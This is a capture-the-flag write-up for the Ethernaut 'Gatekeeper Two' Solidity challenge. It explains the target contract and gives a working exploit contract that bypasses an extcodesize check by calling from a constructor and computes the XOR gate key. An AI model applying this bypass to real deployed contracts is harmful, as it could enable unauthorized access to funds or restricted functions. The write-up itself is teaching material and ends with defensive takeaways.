# Writeup for Gatekeeper Two

Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. Each challenge involves deploying a contract and exploiting its vulnerabilities. If you're new to Solidity and haven't deployed a smart contract before, you can learn how to do so using Remix [here](https://youtu.be/3xNFZI8Ste4?si=i3cWN87OpX85zp6k).

### Challenge Description

This gatekeeper introduces new challenges. Your task is to register as an entrant to pass this level.

### Contract Explanation

If you understand the contract, you can move on to the [exploit](#exploit) part. If you're a beginner, please read the Contract Explanation to gain a better understanding of Solidity.

<details>
<summary>Click to view the source contract and contract explanation</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

The contract has a state variable named `entrant`, which is of type `address`.

```solidity
modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
}
```

The above modifier, `gateOne()`, checks whether `tx.origin` is equal to `msg.sender`.

```solidity
modifier gateTwo() {
    uint256 x;
    assembly {
        x := extcodesize(caller())
    }
    require(x == 0);
    _;
}
```

The `gateTwo()` modifier checks whether the caller is a contract or not. It uses the `extcodesize()` opcode to determine the size of the contract. If the caller is an externally owned account (EOA), `extcodesize()` will return 0. If the caller is a contract address, `extcodesize()` will return the size of the deployed contract's bytecode.

```solidity
modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
}
```

The `gateThree()` modifier takes a `bytes8` argument and performs some XOR operations and checks.

```solidity
function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
}
```

The `enter()` function takes a `bytes8` argument and executes all three modifiers. Once all the modifiers are passed, it sets `entrant` to `tx.origin` (our wallet address) and returns `true`.

</details>

### Key Concepts to Understand

`extcodesize()` is an opcode in Solidity that returns the size of a contract. If the caller is an externally owned account (EOA), `extcodesize()` will return 0. If the caller is a contract address, `extcodesize()` will return the size of the deployed contract's bytecode.

However, if we make a call to another contract in the constructor, `extcodesize()` will return zero. This behavior occurs because the contract is only deployed after the constructor call is completed.

<details>
<summary>Click to check the example below.</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Extcodesize{
    uint256 public size;

    modifier Check_contract(){
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        size=x;
        _;
    }


    function view_size()public Check_contract returns(uint256) {
        return size;
    }
}


contract Call_ExtCodesize{
    uint256 public size;
    Extcodesize extcode;
    constructor(address _addr){
        extcode=Extcodesize(_addr);
        size=extcode.view_size();
    }

    function call_view_size()public{
        size=extcode.view_size();
    }

    function view_size()public view returns(uint256) {
        return size;
    }
}
```

Deploy the `Extcodesize` contract first, then deploy the `Call_ExtCodesize` contract. When we deploy the `Call_ExtCodesize` contract in the constructor, it calls the `view_size()` function in the `Extcodesize` contract. The function executes the `Check_contract()` modifier and assigns the return value of `extcodesize()` to `size`. Since the call is made from the constructor, it will return zero.

Then call the `call_view_size()` function in the `Call_ExtCodesize` contract. The function makes a call to the `view_size()` function in the `Extcodesize` contract. The `view_size()` function executes the `Check_contract()` modifier and assigns the return value of `extcodesize()` to the `size` variable in the `Extcodesize` contract. Once the modifier execution is complete, `view_size()` will return the size of the `Call_ExtCodesize` contract.

</details>

### Exploit

Our goal is to call the `enter()` function and pass all the gates (modifiers).

```solidity
modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
}
```

We can pass `gateOne()` by interacting with the contract using our exploit contract. When we interact with GatekeeperOne using our exploit contract, `msg.sender` will be our exploit contract address, and `tx.origin` will be the address of the externally owned account (EOA) that is calling the exploit contract.

```solidity
modifier gateTwo() {
    uint256 x;
    assembly {
        x := extcodesize(caller())
    }
    require(x == 0);
    _;
}
```

We can pass `gateTwo()` by calling `enter()` from the constructor of our exploit contract. When we call `enter()` from the constructor of our exploit contract, `extcodesize()` will return zero. `caller()` is an opcode in Solidity that returns the `msg.sender`.

```solidity
modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
}
```

We can pass `gateThree()` by passing the correct `gateKey` as an argument during the function call. If we examine the required statement, it performs an XOR operation. When we perform `A^B`, there will be output. Let the output be `C`. So now the equation is `A^B=C`.

XOR has a special property: if `A^B=C`, then `A` can be written as `C^B`, and `B` can be written as `C^A`.

In `gateThree()`, the require statement is `uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max`. Then `_gateKey` can be written as `type(uint64).max^uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))`.

The XOR value depends on `msg.sender`, which is our contract address. Since we know our contract address, we can calculate the `_gateKey` and pass it to the `enter()` function.

<details>
<summary>Click to view the exploit contract</summary>

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperTwo} from "./GatekeeperTwo.sol";

contract ExploitGatekeeperTwo{
    GatekeeperTwo gatekeeperTwo;
    constructor(address _addr){
        gatekeeperTwo=GatekeeperTwo(_addr);
        bytes8 data=bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^  type(uint64).max);
        gatekeeperTwo.enter(data);
        require(gatekeeperTwo.entrant()==msg.sender,"Exploit Failed");
    }
}

```

</details>

Once you deploy this contract, the challenge will be solved.

### Key Takeaways

Be careful when using `extcodesize()` because it will return zero if the function call is made from the `constructor()`.

If our logic depends on `caller()/msg.sender`, we can use `require(tx.origin==msg.sender)`. This ensures that only externally owned accounts are calling the functions.

<p style="text-align:center;">***<strong>Hope you enjoyed this write-up. Keep on hacking and learning!</strong>***</p>
